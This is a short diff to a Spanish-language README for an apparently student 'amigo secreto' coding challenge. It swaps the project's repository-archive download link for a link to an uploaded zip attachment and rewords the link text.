@@ -75,7 +75,7 @@
 <br>
 
 ## Acceso al proyecto
-Puedes [acceder al código fuente del proyecto](https://github.com/RafaelBossh16/challenge-amigo-secreto-oracle-alura-one.git) o [descárgarlo](https://github.com/RafaelBossh16/challenge-amigo-secreto-alura-one/archive/refs/heads/main.zip).
+Puedes [acceder al código fuente del proyecto](https://github.com/RafaelBossh16/challenge-amigo-secreto-oracle-alura-one.git) o [descárgarlo dándole clic aquí](https://github.com/user-attachments/files/18955437/challenge-amigo-secreto-oracle-alura-one-main.zip).
 
 <br>
 
